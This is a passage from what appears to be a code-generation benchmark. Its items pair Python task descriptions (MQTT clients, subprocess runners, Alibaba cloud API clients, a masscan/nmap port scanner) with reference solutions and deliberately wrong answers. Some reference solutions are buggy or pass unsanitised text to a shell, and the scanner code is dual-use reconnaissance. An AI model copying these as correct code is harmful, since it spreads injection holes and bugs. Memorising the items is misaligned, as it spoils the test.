    "Canonical_solution": "from hashlib import sha1\nfrom hmac import new as hmac\nfrom uuid import uuid4\nfrom base64 import b64encode\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode, quote_plus, quote\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"alidns.aliyuncs.com\"\n    METHOD = \"POST\"\n\ndef request(param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s: %s\", API.SITE, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(API.METHOD, '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    data = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]: %s', params['Action'], response.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', params['Action'], data)\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nfrom urllib.parse import urlencode\nimport hmac\nimport hashlib\nimport time\n\nclass AlibabaDNSClient:\n    SITE = \"https://dns.aliyuncs.com\"\n    METHOD = \"GET\"\n\n    def __init__(self, config):\n        self.id = config.access_key_id\n        self.token = config.access_secret\n        self.proxy = config.proxy\n        self.ttl = config.ttl\n        self.site = self.SITE\n        self.method = self.METHOD\n\n    def signature(self, params):\n        sorted_params = sorted(params.items())\n        string_to_sign = '&'.join([f\"{k}={v}\" for k, v in sorted_params])\n        key = self.token.encode('utf-8')\n        signature = hmac.new(key, string_to_sign.encode('utf-8'), hashlib.sha1).digest()\n        return signature.hex()\n\n    def request(self, param=None, **params):\n        all_params = params if param is None else {**param, **params}\n        sig = self.signature(all_params)\n        url = f\"{self.site}/?{urlencode(all_params)}\"\n        headers = {\n            'Authorization': f'AlibabaCloud {self.id}:{sig}',\n            'Content-Type': 'application/x-www-form-urlencoded',\n            'Date': time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())\n        }\n        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None\n        response = requests.request(self.method, url, headers=headers, proxies=proxies)\n        if response.status_code != 200:\n            raise Exception(f\"Request failed with status {response.status_code}\")\n        return response.json()\n\n    def getresponse(self):\n        pass\n\n    def close(self):\n        pass"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Python class that implements an MQTT client for subscribing to topics and handling incoming messages, with support for custom command processing and authentication.\n\nClass Description: The MQTTClient class provides functionality to connect to an MQTT broker, subscribe to specified topics, and process incoming messages. It includes handlers for custom commands and button press events, with optional username/password authentication.\n\nAttributes:\n- host: str - The hostname or IP address of the MQTT broker\n- port: int - The port number of the MQTT broker\n- topic: str - The topic to subscribe to\n- username: str (optional) - Username for broker authentication\n- password: str (optional) - Password for broker authentication\n- client: mqtt.Client - The Paho MQTT client instance\n\nMethods:\n- __init__(host: str, port: int, topic: str, username: str=None, password: str=None) -> None - Initializes the MQTT client with connection parameters\n- on_connect(client: mqtt.Client, userdata: Any, flags: dict, rc: int) -> None - Callback for when the client connects to the broker\n- on_message(client: mqtt.Client, userdata: Any, msg: mqtt.MQTTMessage) -> None - Callback for handling incoming messages\n- start() -> None - Starts the MQTT client connection and message loop\n- custom_command(command: str) -> None - Placeholder for handling custom commands\n- buttonsinglepress() -> None - Placeholder for handling button press events",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\nclass MQTTClient:\n    def __init__(self, host, port, topic, username=None, password=None):\n        self.host = host\n        self.port = port\n        self.topic = topic\n        self.username = username\n        self.password = password\n        self.client = mqtt.Client()\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n\n    def on_connect(self, client, userdata, flags, rc):\n        print(\"Connected with result code \"+str(rc))\n        client.subscribe(self.topic)\n\n    def on_message(self, client, userdata, msg):\n        print(\"Message from MQTT: \"+str(msg.payload.decode('utf-8')))\n        mqtt_query = str(msg.payload.decode('utf-8'))\n        if 'custom' in mqtt_query.lower():\n            mqtt_query = mqtt_query.lower()\n            mqtt_queryidx = mqtt_query.find('custom')\n            mqtt_query = mqtt_query[mqtt_queryidx:]\n            mqtt_query = mqtt_query.replace('custom',\"\",1)\n            mqtt_query = mqtt_query.strip()\n            self.custom_command(mqtt_query)\n        elif mqtt_query.lower() == 'mute':\n            self.buttonsinglepress()\n        else:\n            self.assistant.send_text_query(mqtt_query)\n\n    def start(self):\n        if self.username and self.password:\n            self.client.username_pw_set(self.username, self.password)\n        self.client.connect(self.host, self.port, 60)\n        self.client.loop_forever()\n\n    def custom_command(self, command):\n        # Placeholder for custom command handling\n        pass\n\n    def buttonsinglepress(self):\n        # Placeholder for button press handling\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "import paho.mqtt.client as mqtt\n\nclass MQTTClient:\n    def __init__(self, host: str, port: int, topic: str, username: str = None, password: str = None):\n        self.host = host\n        self.port = port\n        self.topic = topic\n        self.username = username\n        self.password = password\n        self.client = mqtt.Client()\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            client.subscribe(self.topic)\n        else:\n            print(f\"Failed to connect, return code {rc}\")\n\n    def on_message(self, client, userdata, msg):\n        payload = msg.payload.decode()\n        self.custom_command(payload)\n\n    def start(self):\n        self.client.connect(self.host, self.port, 60)\n        if self.username and self.password:\n            self.client.username_pw_set(self.username, self.password)\n        self.client.loop_start()\n\n    def custom_command(self, command: str) -> None:\n        pass\n\n    def buttonsinglepress(self) -> None:\n        pass"
  },
  {
    "Task_id": 274,
    "Instruction": "Task Description: Implement an MQTT consumer class in Python that connects to an MQTT broker, subscribes to topics, and handles incoming messages, with optional authentication support.\n\nClass Description: The MQTTConsumer class provides functionality to connect to an MQTT broker, subscribe to topics, and process incoming messages. It includes callbacks for connection events, message reception, and message publishing. The class supports optional username/password authentication.\n\nAttributes:\n- final_mid: [int] - Stores the message ID of the final message to be published\n- client: [paho.mqtt.client.Client] - The MQTT client instance used for communication\n\nMethods:\n- __init__(client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None) -> None - Initializes the MQTT client with connection parameters and optional authentication\n- on_connect(mqttc, userdata, flags, reason_code, properties) -> None - Callback for when the client connects to the broker\n- on_message(mqttc, userdata, msg) -> None - Callback for when a message is received on a subscribed topic\n- on_publish(mqttc, userdata, mid, reason_code, properties) -> None - Callback for when a message is published\n- subscribe(topic) -> None - Subscribes to the specified topic\n- start_consuming() -> None - Starts the MQTT loop to process network traffic and messages continuously",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\nclass MQTTConsumer:\n    def __init__(self, client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None):\n        self.final_mid = 0\n        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id)\n        self.client._userdata = False\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_publish = self.on_publish\n        \n        if username:\n            self.client.username_pw_set(username, password)\n        self.client.connect(host, port, keepalive)\n\n    def on_connect(self, mqttc, userdata, flags, reason_code, properties):\n        if userdata:\n            print(f\"reason_code: {reason_code}\")\n\n    def on_message(self, mqttc, userdata, msg):\n        if msg.retain == 0:\n            pass\n        else:\n            if userdata:\n                print(\"Clearing topic \" + msg.topic)\n            (rc, self.final_mid) = mqttc.publish(msg.topic, None, 1, True)\n\n    def on_publish(self, mqttc, userdata, mid, reason_code, properties):\n        if mid == self.final_mid:\n            sys.exit()\n\n    def subscribe(self, topic):\n        self.client.subscribe(topic)\n\n    def start_consuming(self):\n        self.client.loop_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "class MQTTConsumer:\n    def __init__(self, client_id=None, host=\"mqtt.eclipseprojects.io\", port=1883, keepalive=60, username=None, password=None):\n        self.client = paho.mqtt.client.Client(client_id=client_id, transport=\"tcp\")\n        self.host = host\n        self.port = port\n        self.keepalive = keepalive\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_publish = self.on_publish\n        self.final_mid = None\n        if username:\n            self.client.username_pw_set(username, password)\n\n    def on_connect(self, mqttc, userdata, flags, reason_code, properties):\n        if reason_code == 0:\n            print(\"Connected to MQTT broker\")\n        else:\n            print(f\"Connection failed with code {reason_code}\")\n\n    def on_message(self, mqttc, userdata, msg):\n        print(f\"Received message on topic {msg.topic}: {msg.payload.decode()}\")\n\n    def on_publish(self, mqttc, userdata, mid, reason_code, properties):\n        print(f\"Message published with mid {mid}\")\n        self.final_mid = mid\n\n    def subscribe(self, topic):\n        self.client.subscribe(topic)\n\n    def start_consuming(self):\n        self.client.connect(host=self.host, port=self.port, keepalive=self.keepalive)\n        self.client.loop_forever()"
  },
  {
    "Task_id": 275,
    "Instruction": "Task Description: Implement an MQTT subscriber client in Python using the Paho MQTT library to connect to a broker, subscribe to topics, and handle incoming messages.\n\nFunction Description: The function `mqtt_subscribe` establishes a connection to an MQTT broker, subscribes to specified topics, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, subscription acknowledgments, and incoming messages.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity, but could be parameterized for flexibility.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Create a Python class that encapsulates MQTT subscriber functionality using the Paho MQTT library, allowing for connection to a broker, topic subscription, and message handling.\n\nClass Description: The `MQTTSubscriber` class provides methods to connect to an MQTT broker, subscribe to topics, and process incoming messages. It uses callback methods to handle connection events, subscription acknowledgments, and message reception.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The MQTT client instance used for communication with the broker.\n- `broker_address`: [str] - The address of the MQTT broker to connect to.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The topic to subscribe to for receiving messages.\n\nMethods:\n\n- `__init__(self, broker_address: str, broker_port: int, topic: str) -> None` - Initializes the MQTT subscriber with broker details and subscription topic.\n- `on_connect(self, mqttc, obj, flags, reason_code, properties) -> None` - Callback for when the client connects to the broker.\n- `on_message(self, mqttc, obj, msg) -> None` - Callback for when a message is received on a subscribed topic.\n- `on_subscribe(self, mqttc, obj, mid, reason_code_list, properties) -> None` - Callback for when the client subscribes to a topic.\n- `connect_and_subscribe(self) -> None` - Connects to the broker and subscribes to the specified topic.\n- `start(self) -> None` - Starts the MQTT loop to process network traffic and messages.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \" + str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \" + str(mid) + \" \" + str(reason_code_list))\n\ndef mqtt_subscribe():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 1883, 60)\n    mqttc.subscribe(\"$SYS/#\")\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "import paho.mqtt.client as mqtt\n\nclass MQTTSubscriber:\n    def __init__(self, broker_address, broker_port, topic):\n        self.client = mqtt.Client()\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        print(\"Connected to broker\")\n\n    def on_message(self, mqttc, obj, msg):\n        print(f\"Received message: {msg.payload.decode()}\")\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(f\"Subscribed with mid: {mid}, reason code: {reason_code_list}\")\n\n    def connect_and_subscribe(self):\n        self.client.connect(self.broker_address, self.broker_port)\n        self.client.subscribe(self.topic)\n\n    def start(self):\n        self.client.loop_start()"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a function to execute system commands using subprocess with pipe-based inter-process communication in Python.\n\nFunction Description: The function should run a system command in a new process, capture its output and error streams, and optionally return a boolean indicating success/failure instead of the output. It should use subprocess.PIPE for communication between processes.\n\nInput:\n- cmd: [str] - The system command to be executed\n- is_ok: [bool] (optional, default=False) - Flag to determine return type (True/False for success/failure if True, output/error if False)\n\nOutput:\n- If is_ok=True: [bool] - Returns True if command executed successfully (returncode=0), False otherwise\n- If is_ok=False: [tuple] - Returns a tuple containing (output, error) as bytes objects from stdout and stderr respectively",
    "Canonical_solution": "import subprocess\n\ndef run_cmd(cmd, is_ok=False):\n    \"\"\"\n    Run cmd\n    \"\"\"\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,\n                         shell=True, executable='/bin/bash')\n\n    output, err = p.communicate()\n    if is_ok:\n        if p.returncode == 0:\n            return True\n        else:\n            return False\n\n    return output, err",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport shlex\n\ndef execute_command(cmd, is_ok=False):\n    args = shlex.split(cmd)\n    result = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=False)\n    if is_ok:\n        return result.returncode == 0\n    else:\n        return (result.stdout, result.stderr)"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Python class that utilizes subprocess communication to perform network scanning operations using masscan and nmap tools for both TCP and UDP ports.\n\nClass Description: The SubprocessScanner class provides functionality to scan a target host for open TCP/UDP ports using masscan and then perform service detection on those ports using nmap. It handles subprocess communication and output parsing.\n\nAttributes:\nhost: str - The target host IP address or hostname to be scanned\n\nMethods:\nuseMasscanTCP() -> list - Scans the host for open TCP ports using masscan and returns a list of open port numbers\nuseMasscanUDP() -> list - Scans the host for open UDP ports using masscan and returns a list of open port numbers\nuseNmapServTCP(port: str) -> str - Performs service detection on the specified TCP port using nmap and returns the service information\nuseNmapServUDP(port: str) -> str - Performs service detection on the specified UDP port using nmap and returns the service information",
    "Canonical_solution": "import subprocess\nimport re\n\nclass SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-p21-25,53,80-90,99,110,113,119,121-123,137-139,\\\n                    170,443-445,456,554,513-514,559,873,888,1080-1099,1200-1212,1234,1243-1255,\\\n                    1433-1434,1521,2000,2049,2181,2200-2300,2375,2535,3127-3128,3300-3310,3389,\\\n                    4443-4444,5000-5001,5432,5900-5901,5432,5984,6000,6370-6380,6984,7000-7010,\\\n                    8000-8200,8443-8449,8880-8900,9000-9001,9043,9080-9100,9200-9210,9300,9668,\\\n                    9876,9990-10000,10080,11211,12345,16379,18080,20000-20010,22220-23000,26379,\\\n                    27010-27020,33060,50070', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/tcp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/tcp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useMasscanUDP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-pU:20-25,79,110,123,137-139,161,180,513-514,559,666,999,\\\n                    1011-1032,1042-1054,1200-1201,1342-1349,2000-2002,3333,6666,26274,26374,26444,26573,\\\n                    27184,27444,29589,29891,30103,31320-31340,34555,35555', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/udp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/udp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useNmapServTCP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n\n    def useNmapServUDP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\nclass SubprocessScanner:\n    def __init__(self, host: str):\n        self.host = host\n\n    def useMasscanTCP(self) -> list:\n        result = subprocess.run([\"masscan\", \"-p-\", \"--tcp\", self.host], capture_output=True, text=True)\n        ports = []\n        for line in result.stdout.splitlines():\n            if line.startswith('open'):\n                parts = line.split()\n                port_proto = parts[1]\n                port, proto = port_proto.split('/')\n                ports.append(int(port))\n        return ports\n\n    def useMasscanUDP(self) -> list:\n        result = subprocess.run([\"masscan\", \"-p-\", \"--udp\", self.host], capture_output=True, text=True)\n        ports = []\n        for line in result.stdout.splitlines():\n            if line.startswith('open'):\n                parts = line.split()\n                port_proto = parts[1]\n                port, proto = port_proto.split('/')\n                ports.append(int(port))\n        return ports\n\n    def useNmapServTCP(self, port: str) -> str:\n        result = subprocess.run([\"nmap\", \"-p\", port, self.host, \"--script=servicedetection\"], capture_output=True, text=True)\n        return result.stdout\n\n    def useNmapServUDP(self, port: str) -> str:\n        result = subprocess.run([\"nmap\", \"-p\", port, self.host, \"--script=servicedetection\"], capture_output=True, text=True)\n        return result.stdout"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Implement a class that interacts with Alibaba Cloud's Flash Recognizer service to convert audio files into text with timing information using HTTP client functionality.\n\nClass Description: AliRecognitionService is a client for Alibaba Cloud's speech recognition API that processes audio files and returns recognition results with timestamps.\n\nAttributes:\nALI_ACCESS_AKID: str - Alibaba Cloud access key ID for authentication\nALI_ACCESS_AKKEY: str - Alibaba Cloud access key secret for authentication\nALI_APP_KEY: str - Application key for the recognition service\ntoken: str - Authentication token obtained using access credentials\nformat: str - Audio file format (default: \"wav\")\nsampleRate: int - Audio sample rate in Hz (default: 16000)\nurl: str - API endpoint URL for the recognition service\n\nMethods:\n__init__(access_key_id: str, access_key_secret: str, app_key: str) -> None - Initializes the recognition service with authentication credentials and application key\nprocess(audioFile: str) -> List[AliRecognitionResult] - Processes an audio file and returns a list of recognition results containing text with begin/end timestamps\n\nHelper Class:\nAliRecognitionResult: A data class to store recognition results with text and timing information\n__init__(text: str, begin_time: int, end_time: int) -> None - Initializes a recognition result with text and its timing information",
    "Canonical_solution": "import http.client\nimport json\nfrom typing import List\n\nclass AliRecognitionResult:\n    def __init__(self, text, begin_time, end_time):\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n\nclass AliRecognitionService:\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str):\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = getToken(self.ALI_ACCESS_AKID, self.ALI_ACCESS_AKKEY)\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = 'https://nls-gateway-cn-shanghai.aliyuncs.com/stream/v1/FlashRecognizer'\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        result_list = []\n        request = self.url + '?appkey=' + self.ALI_APP_KEY\n        request = request + '&token=' + self.token\n        request = request + '&format=' + self.format\n        request = request + '&sample_rate=' + str(self.sampleRate)\n\n        with open(audioFile, mode='rb') as f:\n            audioContent = f.read()\n        \n        host = 'nls-gateway-cn-shanghai.aliyuncs.com'\n        httpHeaders = {'Content-Length': len(audioContent)}\n        \n        conn = http.client.HTTPSConnection(host)\n        conn.request(method='POST', url=request, body=audioContent, headers=httpHeaders)\n        response = conn.getresponse()\n        \n        body = response.read()\n        try:\n            body = json.loads(body)\n            status = body['status']\n            if status == 20000000:\n                result = body['flash_result']\n                if 'sentences' in result:\n                    for sentence in result['sentences']:\n                        result_list.append(\n                            AliRecognitionResult(sentence['text'], sentence['begin_time'], sentence['end_time']))\n        except ValueError:\n            print('The response is not json format string')\n        finally:\n            conn.close()\n        return result_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "from dataclasses import dataclass\nimport requests\n\n@dataclass\nclass AliRecognitionResult:\n    text: str\n    begin_time: int\n    end_time: int\n\nclass AliRecognitionService:\n    ALI_ACCESS_AKID: str\n    ALI_ACCESS_AKKEY: str\n    ALI_APP_KEY: str\n    token: str\n    format: str\n    sampleRate: int\n    url: str\n\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str):\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = \"generated_token\"\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = \"https://api.aliyun.com/flash-recognizer\"\n\n    def process(self, audioFile: str) -> list[AliRecognitionResult]:\n        files = {'audio': open(audioFile, 'rb')}\n        headers = {\n            'Authorization': f'Bearer {self.token}',\n            'Content-Type': f'audio/{self.format}',\n            'App-Key': self.ALI_APP_KEY\n        }\n        response = requests.post(self.url, files=files, headers=headers)\n        # Parse response to extract recognition results\n        # This is a placeholder for actual parsing logic\n        return [AliRecognitionResult(\"example text\", 0, 1000)]"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a function to execute system commands and handle input/output communication between processes using pipes.\n\nFunction Description: The function `runCmd` executes a system command in a subprocess and facilitates communication via pipes. It can handle both cases where input data is provided to the subprocess and where no input is required. The function captures the standard output, standard error, and return code of the executed command.\n\nInput:\n- `cmd`: [List or String] - The command to be executed, either as a list of arguments or a single string.\n- `data`: [Bytes, optional] - Input data to be sent to the subprocess's standard input. Defaults to None if no input is required.\n\nOutput:\n- A tuple containing:\n  - `stdout`: [String] - The decoded standard output of the command.\n  - `stderr`: [String] - The decoded standard error of the command.\n  - `returncode`: [Integer] - The return code of the executed command.",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef runCmd(cmd, data=None):\n    if input is None:\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate()\n    else:\n        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = p.communicate(input=data)\n\n    return stdout.decode('utf-8'), stderr.decode('utf-8'), p.returncode",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef runCmd(cmd, data=None):\n    result = subprocess.run(\n        cmd,\n        input=data,\n        capture_output=True,\n        text=True,\n        encoding='utf-8',\n        errors='replace'\n    )\n    return (result.stdout, result.stderr, result.returncode)"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that runs a Python subprocess with pipe communication, compares the output with expected results from a JSON file, and asserts their equality.\n\nFunction Description: The function `run_subprocess_with_pipe` executes a Python subprocess with given arguments, captures its output through a pipe, and compares this output with expected results loaded from a JSON file. The comparison includes checking the length of the results and verifying that all elements match between the expected and actual outputs.\n\nInput:\n- `expected_file`: [str] - Path to the JSON file containing the expected output data.\n- `*args`: [variable arguments] - Additional command-line arguments to pass to the subprocess.\n\nOutput: None (The function performs assertions to validate the output against the expected results. If assertions fail, an AssertionError is raised.)",
    "Canonical_solution": "import sys\nimport subprocess\nimport json\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    dg = subprocess.Popen([sys.executable] + list(args), stdout=subprocess.PIPE)\n    stdout, _ = dg.communicate()\n    expected = json.load(open(expected_file))\n    result = json.loads(stdout.decode())\n    \n    assert len(expected) == len(result)\n    assert all(r in result for r in expected)\n    assert all(r in expected for r in result)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import json\nimport subprocess\n\ndef run_subprocess_with_pipe(expected_file, *args):\n    with open(expected_file, 'r') as f:\n        expected = json.load(f)\n    result = subprocess.run(args, capture_output=True, text=True)\n    actual = result.stdout.splitlines()\n    assert len(actual) == len(expected), f\"Length mismatch: {len(actual)} vs {len(expected)}\"\n    for a, e in zip(actual, expected):\n        assert a == e, f\"Element {a} != {e}\""
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: The task involves creating Python functions that utilize subprocess and pipes to execute shell commands and handle their input/output streams. The functions should be able to run commands directly or filter text through commands in a shell environment.\n\nFunction Description: \n\n1. `run_and_read`: Executes a shell command and captures its standard output and error streams, then returns the decoded output (prioritizing stdout over stderr if available).\n\n2. `filter_region`: Takes a text input, pipes it through a shell command (using the system's default shell or a specified shell), and returns the processed output from the command.\n\nInput:\n\n- For `run_and_read`:\n  - `view`: (object) - A view object (contextual, typically from an editor/IDE)\n  - `cmd`: (str) - The shell command to execute\n\n- For `filter_region`:\n  - `view`: (object) - A view object (contextual, typically from an editor/IDE)\n  - `text`: (str) - The text to be processed by the command\n  - `command`: (str) - The shell command to process the text\n\nOutput:\n\n- For `run_and_read`: (str) - The decoded output from the command (stdout if available, otherwise stderr)\n- For `filter_region`: (str) - The decoded output from the command after processing the input text",
    "Canonical_solution": "import os\nimport subprocess\nfrom subprocess import PIPE\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen([cmd],\n            stdout=PIPE,\n            stderr=PIPE,\n            shell=True).communicate()\n    try:\n        return (out or err).decode('utf-8')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, text, command):\n    shell = view.settings().get('VintageousEx_linux_shell')\n    shell = shell or os.path.expandvars(\"$SHELL\")\n    p = subprocess.Popen([shell, '-c', 'echo \"%s\" | %s' % (text, command)],\n             stderr=subprocess.PIPE,\n             stdout=subprocess.PIPE)\n    return p.communicate()[0][:-1].decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef run_and_read(view, cmd):\n    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n    if result.stdout:\n        return result.stdout\n    else:\n        return result.stderr\n\ndef filter_region(view, text, command):\n    process = subprocess.run(command, shell=True, input=text, capture_output=True, text=True)\n    if process.stdout:\n        return process.stdout\n    else:\n        return process.stderr"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a function that executes a command in a subprocess using Python's subprocess module, capturing and returning the output and error streams along with the return code.\n\nFunction Description: The function `runvol` executes a given command (constructed from Python interpreter path, volatility script path, and additional arguments) as a subprocess. It captures the standard output, standard error, and return code of the subprocess, then returns these values after printing them for debugging purposes.\n\nInput:\n- `args`: [List[str]] - Additional command-line arguments to pass to the volatility script\n- `volatility`: [str] - Path to the volatility script to be executed\n- `python`: [str] - Path to the Python interpreter to use for execution\n\nOutput:\n- Returns a tuple containing:\n  - `returncode`: [int] - The exit code of the subprocess\n  - `stdout`: [bytes] - The standard output of the subprocess\n  - `stderr`: [bytes] - The standard error of the subprocess",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef runvol(args, volatility, python):\n    volpy = volatility\n    python_cmd = python\n\n    cmd = [python_cmd, volpy] + args\n    print(\" \".join(cmd))\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = p.communicate()\n    print(\"stdout:\")\n    sys.stdout.write(str(stdout))\n    print(\"\")\n    print(\"stderr:\")\n    sys.stdout.write(str(stderr))\n    print(\"\")\n\n    return p.returncode, stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef runvol(args, volatility, python):\n    command = [python, volatility] + args\n    result = subprocess.run(command, capture_output=True, text=False)\n    print(\"STDOUT:\", result.stdout.decode())\n    print(\"STDERR:\", result.stderr.decode())\n    return (result.returncode, result.stdout, result.stderr)"
  },
  {
    "Task_id": 284,
